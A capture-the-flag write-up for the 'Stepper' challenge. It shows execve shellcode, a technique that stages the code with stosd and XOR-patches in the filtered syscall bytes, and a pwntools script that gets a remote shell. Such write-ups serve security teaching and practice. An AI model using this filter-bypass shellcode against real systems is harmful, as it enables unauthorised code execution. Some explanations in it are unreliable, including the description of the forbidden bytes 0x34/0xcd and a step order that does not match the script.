# Stepper — CTF Writeup

## Challenge Overview

We are given a binary `stepper.c` that acts as a constrained execution bay. The program:

- Allows up to **12 steps**.
- Each step accepts up to **6 bytes** of machine code.
- Executes each chunk in a fresh slot.
- **Registers persist** across steps, but the instruction slot is overwritten.
- Forbids the bytes: `0x0f`, `0x05`, `0x34`, `0xcd`.

The goal is to execute a payload that spawns a shell and prints the flag. Flag format: `CSCTF{...}`.

The forbidden bytes block direct syscall instructions:
- `0x0f 0x05` → `syscall`
- `0x34 0xcd` → `xor al, 0xcd` (part of `sysenter`/`int 0x80` patterns)

So we cannot submit a `syscall` directly. We must smuggle it past the byte filter.

---

## Analysis

### Memory Layout

The program `mmap`s two pages:

```c
unsigned char *code = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, ...);
unsigned char *stack = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, ...);
```

- `code` is **RWX**.
- `stack` is **RW**.

For each step, the program:

1. Reads a length `n` (≤ 6).
2. Reads `n` bytes into `chunk`.
3. Rejects the chunk if any byte is in `{0x0f, 0x05, 0x34, 0xcd}`.
4. Fills `code[0..7]` with `NOP` (`0x90`), then copies `chunk` to `code[0..n-1]`.
5. At `code[8]`, places a trampoline:
   ```asm
   jmp qword ptr [rip+0]
   ```
   followed by the address of `guest_exit`.
6. Calls `run_step(code)`.

`run_step` saves host context, loads guest registers from `ctx`, sets `rsp` from `ctx[RSP]`, and jumps to the code slot.

After the guest code runs, it falls through to the trampoline, which jumps to `guest_exit`. `guest_exit` saves all guest registers back to `ctx`, restores the host stack, and returns.

Thus, we have **6 bytes per step** and **registers persist**.

---

## Exploit Strategy

We need to execute `execve("/bin//sh", NULL, NULL)`. The final shellcode is:

```asm
xor edx, edx
push rdx
mov rbx, 0x68732f2f6e69622f   ; "/bin//sh"
push rbx
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
push 59
pop rax
syscall
```

Hex:

```hex
31 d2 52 48 bb 2f 62 69 6e 2f 2f 73 68
53 48 89 e7 52 57 48 89 e6 6a 3b 58 0f 05
```

The `0f 05` bytes are forbidden. We will:

1. Stage this shellcode into a scratch area inside the same RWX `code` page, using only safe instructions.
2. Write `0x90 0x90` placeholders where `0f 05` should go.
3. Patch the placeholders into `0f 05` at runtime using an XOR instruction with safe bytes.
4. Jump to the staged shellcode.

### Step-by-step Plan

1. **Get a pointer to the slot**
   `call $+0; pop rdi` gives us the address of the current slot in `rdi`.
   ```asm
   e8 00 00 00 00   ; call $+0
   5f               ; pop rdi
   ```

2. **Point `rdi` to a scratch area**
   Add `0x1b` to `rdi` so it points to `code + 0x20`. Also push `rdi` for later.
   ```asm
   48 83 c7 1b      ; add rdi, 0x1b
   57               ; push rdi
   ```

3. **Write the shellcode 4 bytes at a time**
   Use:
   ```asm
   mov eax, imm32
   stosd
   ```
   `stosd` writes `eax` to `[rdi]` and increments `rdi` by 4.
   The bytes for `mov eax, imm32` are `b8 xx xx xx xx` (safe).
   `stosd` is `ab` (safe).

   We write 7 dwords (28 bytes). The last dword contains `0x90 0x90` placeholders instead of `0f 05`.

4. **Patch the placeholders**
   After writing, `rdi` points past the shellcode. The placeholders are at `rdi - 3` (because the last dword was written at `rdi - 4`, and the `0f 05` would be at offset 2–3 of that dword).
   Use:
   ```asm
   xor word ptr [rdi - 3], 0x959f
   ```
   This turns `0x9090` into `0x050f`, which in memory is `0f 05`.
   The instruction bytes are:
   ```hex
   66 81 77 fd 9f 95
   ```
   All safe.

5. **Write the final padding dword**
   The shellcode length is 27 bytes. We write 7 dwords = 28 bytes, so one byte of padding is fine.
   We write `mov eax, 0x90909058; stosd` (bytes: `b8 58 90 90 90 ab`). That writes `58 90 90 90` at offsets 24–27.
   Then patch `word ptr [rdi-3]` (offsets 25–26) with `xor word ptr [rdi-3], 0x959f`. That changes `90 90` to `0f 05`.

6. **Jump to the shellcode**
   We pushed `rdi` (the scratch address) earlier. Now:
   ```asm
   pop rdi
   jmp rdi
   ```
   Bytes: `5f ff e7`.

---

## Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# io = process("./stepper")
io = remote("HOST", PORT)

chunks = [
    # 1. call $+0 ; pop rdi
    bytes.fromhex("e8000000005f"),

    # 2. add rdi, 0x1b ; push rdi
    #    rdi = code + 0x20
    bytes.fromhex("4883c71b57"),

    # 3-9. write 7 dwords of shellcode
    # dword 0: 31 d2 52 48
    bytes.fromhex("b831d25248ab"),
    # dword 1: bb 2f 62 69
    bytes.fromhex("b8bb2f6269ab"),
    # dword 2: 6e 2f 2f 73
    bytes.fromhex("b86e2f2f73ab"),
    # dword 3: 68 53 48 89
    bytes.fromhex("b868534889ab"),
    # dword 4: e7 52 57 48
    bytes.fromhex("b8e7525748ab"),
    # dword 5: 89 e6 6a 3b
    bytes.fromhex("b889e66a3bab"),
    # dword 6: 58 90 90 90  (0f 05 will be patched in)
    bytes.fromhex("b858909090ab"),

    # 10. patch placeholder 90 90 -> 0f 05
    #     xor word ptr [rdi-3], 0x959f
    bytes.fromhex("668177fd9f95"),

    # 11. write last padding dword
    bytes.fromhex("b890909090ab"),

    # 12. pop rdi ; jmp rdi
    bytes.fromhex("5fffe7"),
]

for c in chunks:
    assert len(c) <= 6
    assert not any(b in c for b in [0x0f, 0x05, 0x34, 0xcd])
    io.sendlineafter(b"length> ", str(len(c)).encode())
    io.sendafter(b"code> ", c)

# Shell should now be spawned.
io.sendline(b"cat flag; cat /flag 2>/dev/null")
io.interactive()
```

---

## Explanation of Each Step

| Step | Bytes | Meaning |
|------|-------|---------|
| 1 | `e8 00 00 00 00 5f` | `call $+0; pop rdi` — get slot address |
| 2 | `48 83 c7 1b 57` | `add rdi, 0x1b; push rdi` — point to scratch, save for later |
| 3 | `b8 31 d2 52 48 ab` | `mov eax, 0x4852d231; stosd` — write `31 d2 52 48` |
| 4 | `b8 bb 2f 62 69 ab` | write `bb 2f 62 69` |
| 5 | `b8 6e 2f 2f 73 ab` | write `6e 2f 2f 73` |
| 6 | `b8 68 53 48 89 ab` | write `68 53 48 89` |
| 7 | `b8 e7 52 57 48 ab` | write `e7 52 57 48` |
| 8 | `b8 89 e6 6a 3b ab` | write `89 e6 6a 3b` |
| 9 | `b8 58 90 90 90 ab` | write `58 90 90 90` |
| 10 | `66 81 77 fd 9f 95` | `xor word ptr [rdi-3], 0x959f` — patch `90 90` → `0f 05` |
| 11 | `b8 90 90 90 90 ab` | write padding `90 90 90 90` |
| 12 | `5f ff e7` | `pop rdi; jmp rdi` — jump to shellcode |

After step 12, the staged shellcode executes `execve("/bin//sh", NULL, NULL)`. The shell inherits the service's stdin/stdout, so we can run `cat flag`.

---

## Flag

Running the exploit yields a shell. Execute:

```bash
cat flag
```

and retrieve the flag in the format `CSCTF{...}`.